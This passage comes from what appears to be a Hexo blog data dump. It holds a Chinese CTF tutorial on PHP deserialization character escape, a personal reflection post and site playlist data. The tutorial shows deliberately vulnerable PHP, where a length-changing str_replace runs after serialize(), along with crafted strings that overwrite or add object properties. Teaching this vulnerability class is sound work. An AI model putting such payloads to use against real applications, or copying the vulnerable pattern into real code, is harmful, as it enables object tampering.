中的'bb'替换为'ccc'，替换后字符串变长\n\n其后对$AA进行序列化然后调用了这个filter函数并反序列化输出，这就构成了一个反序列化字符逃逸漏洞\n\n如果这时我们有办法构造payload更改$AA中的内容，便可以利用这个漏洞，因为只要$name或$pass属性中每多一对'bb'字符，便会使之后的$res中字符多一个\n\n而unserialize函数读取序列化字符串时，是通过s:所指定的长度和;\"}来判断一个属性的结束的，这二者缺一不可，如果没有s所指定的长度，unserialize()就会在读到;\"}时结束一个属性的读取，也就是如果属性的值中有;\"}，就可以直接“骗”过它，让它认为这段字符串结束了，但一般来说，s指定了字符串的长度让它不会轻易“受骗”。\n\n但filter函数给了我们一个“戏弄”它的机会，因为每个'bb'字符串都会使最终的字符串长度多一位，让实际的字符串比s所记录的长一位。仅仅只长一位没什么，php会报错，但如果在'bb'字符串后面的内容是\";}呢？如果name的内容是\"bbbbbb\";}\",则序列化后，s的值为9，在被filter函数过滤后为\"ccccccccc\";}\",那么因为s为9，unserialize函数只会读到最后一个'c'处,由于后面是;\"}，它便会认为这串字符结束了。\n\n这便是反序列化字符逃逸的基本原理了，利用这种方式，我们就能任意构造name属性后面的内容，比如更改pass的内容，甚至添加一个“本不应该存在的属性”。如：构造name=“bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\";s:4:\"pass\";s:11:\"Hello,world\";}“, 这里面有33个'bb', 紧跟其后的\";s:11:\"Hello,world\";}也是33个字符，这样经过filter函数替换后,多出来的33个'c'会“顶”掉后面的\";s:4:\"pass\";s:11:\"Hello,world\";}，并使后者被当作pass属性读入，这样，最终name的值为33个'ccc'，而pass的值就变为Hello,world\n\n## 替换后字符变短\n\n这种情况和上面那种大同小异，核心原理都是一样的，“替换后字符串长度改变，在字符串中构造payload”。唯一不同的大概是，上面这种payload构造在被替换的字符串里面，这种的payload构造在下一个属性的字符串里面\n\n```php\n<?php\nfunction filter($str){\n    return str_replace('bbb', 'cc', $str);\n}\nclass A{\n    public $name='aaaa';\n    public $pass='123456';\n}\n$AA=new A();\necho serialize($AA).\"\\n\";\n$res=filter(serialize($AA));\n\n$c=unserialize($res);\necho $c->pass;\n?>\n```\n\n还是这串代码，不同的地方仅仅是从用'ccc'替换'bb'变成了用'cc'替换'bbb' \n\n这时，构造name=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb,pass=123456\";s:5:\"pass2\";s:5:\"Hello\";}\n\n这里面有24个'bbb'，经过filter后会缩短24个字符，刚好可以包裹 \";s:4:\"pass\";s:6:\"123456 这一段，于是后一段\";s:5:\"pass2\";s:5:\"Hello\";}就被当作另一个属性被读进去了，这样我们又能更改本来不能更改的属性的内容甚至添加属性了\n\n反序列化字符逃逸的应用条件十分苛刻，一般只有比赛的时候用的上，但终归是一种漏洞，其基本原理就在这里了","slug":"2020-09-20-php反序列化字符逃逸","published":1,"updated":"2020-09-29T13:49:45.418Z","comments":1,"photos":[],"link":"","_id":"ckkntx9ix0002xov7r4nqmj77","content":"<h1 id=\"PHP反序列化字符逃逸\"><a href=\"#PHP反序列化字符逃逸\" class=\"headerlink\" title=\"PHP反序列化字符逃逸\"></a>PHP反序列化字符逃逸</h1><p>读题目源码的时候，一旦看到”serialize()”和”replace”(比如str_replace(),preg_replace()等)，就基本可以开始往反序列化逃逸的方向考虑了<br>反序列化字符逃逸都大同小异，基本可以分为“替换后字符串变长”和“替换后字符串变短的</p>\n<p>其核心原理都是利用替换后变长或变短的字符串“顶出”后一个属性并将payload替换进去，或“吞并”后一个属性值的一部分，使我们在后一个属性中构建的payload成为我们想要的属性</p>\n<h2 id=\"替换之后字符串变长\"><a href=\"#替换之后字符串变长\" class=\"headerlink\" title=\"替换之后字符串变长\"></a>替换之后字符串变长</h2><p>示例代码:</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">'bb'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'ccc'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token string\">'aaaa'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$pass</span><span class=\"token operator\">=</span><span class=\"token string\">'123456'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$AA</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$AA</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$res</span><span class=\"token operator\">=</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$AA</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$res</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$c</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">pass</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>上面这段代码中的filter()函数，会将传入的字符串 $str 中的’bb’替换为’ccc’，替换后字符串变长</p>\n<p>其后对$AA进行序列化然后调用了这个filter函数并反序列化输出，这就构成了一个反序列化字符逃逸漏洞</p>\n<p>如果这时我们有办法构造payload更改$AA中的内容，便可以利用这个漏洞，因为只要$name或$pass属性中每多一对’bb’字符，便会使之后的$res中字符多一个</p>\n<p>而unserialize函数读取序列化字符串时，是通过s:所指定的长度和;”}来判断一个属性的结束的，这二者缺一不可，如果没有s所指定的长度，unserialize()就会在读到;”}时结束一个属性的读取，也就是如果属性的值中有;”}，就可以直接“骗”过它，让它认为这段字符串结束了，但一般来说，s指定了字符串的长度让它不会轻易“受骗”。</p>\n<p>但filter函数给了我们一个“戏弄”它的机会，因为每个’bb’字符串都会使最终的字符串长度多一位，让实际的字符串比s所记录的长一位。仅仅只长一位没什么，php会报错，但如果在’bb’字符串后面的内容是”;}呢？如果name的内容是”bbbbbb”;}”,则序列化后，s的值为9，在被filter函数过滤后为”ccccccccc”;}”,那么因为s为9，unserialize函数只会读到最后一个’c’处,由于后面是;”}，它便会认为这串字符结束了。</p>\n<p>这便是反序列化字符逃逸的基本原理了，利用这种方式，我们就能任意构造name属性后面的内容，比如更改pass的内容，甚至添加一个“本不应该存在的属性”。如：构造name=“bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb”;s:4:”pass”;s:11:”Hello,world”;}“, 这里面有33个’bb’, 紧跟其后的”;s:11:”Hello,world”;}也是33个字符，这样经过filter函数替换后,多出来的33个’c’会“顶”掉后面的”;s:4:”pass”;s:11:”Hello,world”;}，并使后者被当作pass属性读入，这样，最终name的值为33个’ccc’，而pass的值就变为Hello,world</p>\n<h2 id=\"替换后字符变短\"><a href=\"#替换后字符变短\" class=\"headerlink\" title=\"替换后字符变短\"></a>替换后字符变短</h2><p>这种情况和上面那种大同小异，核心原理都是一样的，“替换后字符串长度改变，在字符串中构造payload”。唯一不同的大概是，上面这种payload构造在被替换的字符串里面，这种的payload构造在下一个属性的字符串里面</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">'bbb'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'cc'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token string\">'aaaa'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$pass</span><span class=\"token operator\">=</span><span class=\"token string\">'123456'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$AA</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$AA</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$res</span><span class=\"token operator\">=</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$AA</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$res</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$c</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">pass</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>还是这串代码，不同的地方仅仅是从用’ccc’替换’bb’变成了用’cc’替换’bbb’ </p>\n<p>这时，构造name=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb,pass=123456”;s:5:”pass2”;s:5:”Hello”;}</p>\n<p>这里面有24个’bbb’，经过filter后会缩短24个字符，刚好可以包裹 “;s:4:”pass”;s:6:”123456 这一段，于是后一段”;s:5:”pass2”;s:5:”Hello”;}就被当作另一个属性被读进去了，这样我们又能更改本来不能更改的属性的内容甚至添加属性了</p>\n<p>反序列化字符逃逸的应用条件十分苛刻，一般只有比赛的时候用的上，但终归是一种漏洞，其基本原理就在这里了</p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"PHP反序列化字符逃逸\"><a href=\"#PHP反序列化字符逃逸\" class=\"headerlink\" title=\"PHP反序列化字符逃逸\"></a>PHP反序列化字符逃逸</h1><p>读题目源码的时候，一旦看到”serialize()”和”replace”(比如str_replace(),preg_replace()等)，就基本可以开始往反序列化逃逸的方向考虑了<br>反序列化字符逃逸都大同小异，基本可以分为“替换后字符串变长”和“替换后字符串变短的</p>\n<p>其核心原理都是利用替换后变长或变短的字符串“顶出”后一个属性并将payload替换进去，或“吞并”后一个属性值的一部分，使我们在后一个属性中构建的payload成为我们想要的属性</p>\n<h2 id=\"替换之后字符串变长\"><a href=\"#替换之后字符串变长\" class=\"headerlink\" title=\"替换之后字符串变长\"></a>替换之后字符串变长</h2><p>示例代码:</p>\n<pre><code class=\"php\">&lt;?php\nfunction filter($str){\n    return str_replace(&#39;bb&#39;, &#39;ccc&#39;, $str);\n}\nclass A{\n    public $name=&#39;aaaa&#39;;\n    public $pass=&#39;123456&#39;;\n}\n$AA=new A();\necho serialize($AA).&quot;\\n&quot;;\n$res=filter(serialize($AA));\n\n$c=unserialize($res);\necho $c-&gt;pass;\n?&gt;</code></pre>\n<p>上面这段代码中的filter()函数，会将传入的字符串 $str 中的’bb’替换为’ccc’，替换后字符串变长</p>\n<p>其后对$AA进行序列化然后调用了这个filter函数并反序列化输出，这就构成了一个反序列化字符逃逸漏洞</p>\n<p>如果这时我们有办法构造payload更改$AA中的内容，便可以利用这个漏洞，因为只要$name或$pass属性中每多一对’bb’字符，便会使之后的$res中字符多一个</p>\n<p>而unserialize函数读取序列化字符串时，是通过s:所指定的长度和;”}来判断一个属性的结束的，这二者缺一不可，如果没有s所指定的长度，unserialize()就会在读到;”}时结束一个属性的读取，也就是如果属性的值中有;”}，就可以直接“骗”过它，让它认为这段字符串结束了，但一般来说，s指定了字符串的长度让它不会轻易“受骗”。</p>\n<p>但filter函数给了我们一个“戏弄”它的机会，因为每个’bb’字符串都会使最终的字符串长度多一位，让实际的字符串比s所记录的长一位。仅仅只长一位没什么，php会报错，但如果在’bb’字符串后面的内容是”;}呢？如果name的内容是”bbbbbb”;}”,则序列化后，s的值为9，在被filter函数过滤后为”ccccccccc”;}”,那么因为s为9，unserialize函数只会读到最后一个’c’处,由于后面是;”}，它便会认为这串字符结束了。</p>\n<p>这便是反序列化字符逃逸的基本原理了，利用这种方式，我们就能任意构造name属性后面的内容，比如更改pass的内容，甚至添加一个“本不应该存在的属性”。如：构造name=“bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb”;s:4:”pass”;s:11:”Hello,world”;}“, 这里面有33个’bb’, 紧跟其后的”;s:11:”Hello,world”;}也是33个字符，这样经过filter函数替换后,多出来的33个’c’会“顶”掉后面的”;s:4:”pass”;s:11:”Hello,world”;}，并使后者被当作pass属性读入，这样，最终name的值为33个’ccc’，而pass的值就变为Hello,world</p>\n<h2 id=\"替换后字符变短\"><a href=\"#替换后字符变短\" class=\"headerlink\" title=\"替换后字符变短\"></a>替换后字符变短</h2><p>这种情况和上面那种大同小异，核心原理都是一样的，“替换后字符串长度改变，在字符串中构造payload”。唯一不同的大概是，上面这种payload构造在被替换的字符串里面，这种的payload构造在下一个属性的字符串里面</p>\n<pre><code class=\"php\">&lt;?php\nfunction filter($str){\n    return str_replace(&#39;bbb&#39;, &#39;cc&#39;, $str);\n}\nclass A{\n    public $name=&#39;aaaa&#39;;\n    public $pass=&#39;123456&#39;;\n}\n$AA=new A();\necho serialize($AA).&quot;\\n&quot;;\n$res=filter(serialize($AA));\n\n$c=unserialize($res);\necho $c-&gt;pass;\n?&gt;</code></pre>\n<p>还是这串代码，不同的地方仅仅是从用’ccc’替换’bb’变成了用’cc’替换’bbb’ </p>\n<p>这时，构造name=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb,pass=123456”;s:5:”pass2”;s:5:”Hello”;}</p>\n<p>这里面有24个’bbb’，经过filter后会缩短24个字符，刚好可以包裹 “;s:4:”pass”;s:6:”123456 这一段，于是后一段”;s:5:”pass2”;s:5:”Hello”;}就被当作另一个属性被读进去了，这样我们又能更改本来不能更改的属性的内容甚至添加属性了</p>\n<p>反序列化字符逃逸的应用条件十分苛刻，一般只有比赛的时候用的上，但终归是一种漏洞，其基本原理就在这里了</p>\n"},{"layout":"post","title":"你好，世界！","date":"2020-03-01T16:00:00.000Z","description":"尽力而行，量力而为；乘兴而来，趁兴而归","typora-copy-images-to":"..\\img","typora-root-url":"..","_content":"# 你好，世界！\n\n​\t我想应该所有人（除非真有人已经自大到目空一切的地步），都经常会在一人独处时默默自省吧。\n\n​\t我是个年仅19岁的年轻人，若说有什么人生阅历，那是不可能的。但我也一眨眼就活过了近20年的岁月，20年，总也不算太短。\n\n这20年的前十年，我想我过得还算快乐（或者我已经把不快乐的部分忘得差不多了，那同样也证明这10年是快乐的）。而这后面十年，\n\n或许记忆里更多的就是青春的迷惑和成长的痛苦了。\n\n​\t这些所谓的痛苦从何而来？或许是，我给自己定的行为准则与我本身的性格产生的矛盾。\n\n​\t我一直都是个不好不坏的人：有不好不坏的性格，不好不坏的人际交往，不好不坏的家庭，不好不坏的成绩，上一个不好不坏的大学，若事情就这样发展下去，或许最后我会拿一个不好不坏的成绩毕业，找一份不好不坏的程序员工作，拿一份不好不坏的工资，找个不好不坏的老婆，组个不好不坏的家庭，生个不好不坏的孩子，不好不坏的养他（她）长大，退休后和几个关系不好不坏的老伙计整天玩乐，最后不好不坏的过完这一生。\n\n​\t为什么我每件事都做得不好不坏？无论大事小事，就没有做的特别出类拔萃的？（追求出类拔萃，这也是一个痛苦的源泉吧，可我确实不甘心不好不坏、不上不下地过完这一生）因为我不能做到“取舍”。\n\n​\t“舍得”，是我这辈子做的最差的事，无论事大事小，我“舍不得”，这就是为什么我永远看起来还可以却又不是很出色。或许我是有一些能力的，能够把一些事情做好，但并不能把所有事情做好，而那些不是非常重要而又有些在意的东西，我学不会割舍。\n\n​\t但仅仅将我现在的处境归咎于不会“割舍”，实在是过于粗暴了。我一直在找一种平衡，一种精神世界与现实生活之间融洽相处的平衡点，可这样的平衡点或许并不存在。人生本来就有很多求而不得的事，对于那样的事，无需多想，就尽自己**应该尽的力**，尔后将它的结果交给老天来决定好了。而那些可望而可求的事，才是更重要、最值得付出最大限度地精力与意愿去达成它。但又不应该觉得“努力了就能成功”，这个世界上，没有谁是主角，能够永远成功，永远顺心如意。\n\n​\t学会割舍，学会接受失败，学会接受自己，找到真实的自己。尽力而行，量力而行。\n\n​\t最重要的，找到活在这人世间的快乐，始终牢记自己为了什么而努力，不是为了那些世俗的价值和欲望，是为了“**我**”。好好的生活，享受这世间的每一分每一秒。","source":"_posts/2020-03-02-how-to-live.md","raw":"---\nlayout: post\ntitle: 你好，世界！\ndate: 2020-3-02\ncategories: blog\ntags: [开场白,人生感悟]\ndescription: 尽力而行，量力而为；乘兴而来，趁兴而归\ntypora-copy-images-to: ..\\img\ntypora-root-url: ..\n---\n# 你好，世界！\n\n​\t我想应该所有人（除非真有人已经自大到目空一切的地步），都经常会在一人独处时默默自省吧。\n\n​\t我是个年仅19岁的年轻人，若说有什么人生阅历，那是不可能的。但我也一眨眼就活过了近20年的岁月，20年，总也不算太短。\n\n这20年的前十年，我想我过得还算快乐（或者我已经把不快乐的部分忘得差不多了，那同样也证明这10年是快乐的）。而这后面十年，\n\n或许记忆里更多的就是青春的迷惑和成长的痛苦了。\n\n​\t这些所谓的痛苦从何而来？或许是，我给自己定的行为准则与我本身的性格产生的矛盾。\n\n​\t我一直都是个不好不坏的人：有不好不坏的性格，不好不坏的人际交往，不好不坏的家庭，不好不坏的成绩，上一个不好不坏的大学，若事情就这样发展下去，或许最后我会拿一个不好不坏的成绩毕业，找一份不好不坏的程序员工作，拿一份不好不坏的工资，找个不好不坏的老婆，组个不好不坏的家庭，生个不好不坏的孩子，不好不坏的养他（她）长大，退休后和几个关系不好不坏的老伙计整天玩乐，最后不好不坏的过完这一生。\n\n​\t为什么我每件事都做得不好不坏？无论大事小事，就没有做的特别出类拔萃的？（追求出类拔萃，这也是一个痛苦的源泉吧，可我确实不甘心不好不坏、不上不下地过完这一生）因为我不能做到“取舍”。\n\n​\t“舍得”，是我这辈子做的最差的事，无论事大事小，我“舍不得”，这就是为什么我永远看起来还可以却又不是很出色。或许我是有一些能力的，能够把一些事情做好，但并不能把所有事情做好，而那些不是非常重要而又有些在意的东西，我学不会割舍。\n\n​\t但仅仅将我现在的处境归咎于不会“割舍”，实在是过于粗暴了。我一直在找一种平衡，一种精神世界与现实生活之间融洽相处的平衡点，可这样的平衡点或许并不存在。人生本来就有很多求而不得的事，对于那样的事，无需多想，就尽自己**应该尽的力**，尔后将它的结果交给老天来决定好了。而那些可望而可求的事，才是更重要、最值得付出最大限度地精力与意愿去达成它。但又不应该觉得“努力了就能成功”，这个世界上，没有谁是主角，能够永远成功，永远顺心如意。\n\n​\t学会割舍，学会接受失败，学会接受自己，找到真实的自己。尽力而行，量力而行。\n\n​\t最重要的，找到活在这人世间的快乐，始终牢记自己为了什么而努力，不是为了那些世俗的价值和欲望，是为了“**我**”。好好的生活，享受这世间的每一分每一秒。","slug":"2020-03-02-how-to-live","published":1,"updated":"2020-12-01T09:28:50.996Z","comments":1,"photos":[],"link":"","_id":"ckkntx9j20004xov77lct0873","content":"<h1 id=\"你好，世界！\"><a href=\"#你好，世界！\" class=\"headerlink\" title=\"你好，世界！\"></a>你好，世界！</h1><p>​    我想应该所有人（除非真有人已经自大到目空一切的地步），都经常会在一人独处时默默自省吧。</p>\n<p>​    我是个年仅19岁的年轻人，若说有什么人生阅历，那是不可能的。但我也一眨眼就活过了近20年的岁月，20年，总也不算太短。</p>\n<p>这20年的前十年，我想我过得还算快乐（或者我已经把不快乐的部分忘得差不多了，那同样也证明这10年是快乐的）。而这后面十年，</p>\n<p>或许记忆里更多的就是青春的迷惑和成长的痛苦了。</p>\n<p>​    这些所谓的痛苦从何而来？或许是，我给自己定的行为准则与我本身的性格产生的矛盾。</p>\n<p>​    我一直都是个不好不坏的人：有不好不坏的性格，不好不坏的人际交往，不好不坏的家庭，不好不坏的成绩，上一个不好不坏的大学，若事情就这样发展下去，或许最后我会拿一个不好不坏的成绩毕业，找一份不好不坏的程序员工作，拿一份不好不坏的工资，找个不好不坏的老婆，组个不好不坏的家庭，生个不好不坏的孩子，不好不坏的养他（她）长大，退休后和几个关系不好不坏的老伙计整天玩乐，最后不好不坏的过完这一生。</p>\n<p>​    为什么我每件事都做得不好不坏？无论大事小事，就没有做的特别出类拔萃的？（追求出类拔萃，这也是一个痛苦的源泉吧，可我确实不甘心不好不坏、不上不下地过完这一生）因为我不能做到“取舍”。</p>\n<p>​    “舍得”，是我这辈子做的最差的事，无论事大事小，我“舍不得”，这就是为什么我永远看起来还可以却又不是很出色。或许我是有一些能力的，能够把一些事情做好，但并不能把所有事情做好，而那些不是非常重要而又有些在意的东西，我学不会割舍。</p>\n<p>​    但仅仅将我现在的处境归咎于不会“割舍”，实在是过于粗暴了。我一直在找一种平衡，一种精神世界与现实生活之间融洽相处的平衡点，可这样的平衡点或许并不存在。人生本来就有很多求而不得的事，对于那样的事，无需多想，就尽自己<strong>应该尽的力</strong>，尔后将它的结果交给老天来决定好了。而那些可望而可求的事，才是更重要、最值得付出最大限度地精力与意愿去达成它。但又不应该觉得“努力了就能成功”，这个世界上，没有谁是主角，能够永远成功，永远顺心如意。</p>\n<p>​    学会割舍，学会接受失败，学会接受自己，找到真实的自己。尽力而行，量力而行。</p>\n<p>​    最重要的，找到活在这人世间的快乐，始终牢记自己为了什么而努力，不是为了那些世俗的价值和欲望，是为了“<strong>我</strong>”。好好的生活，享受这世间的每一分每一秒。</p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila 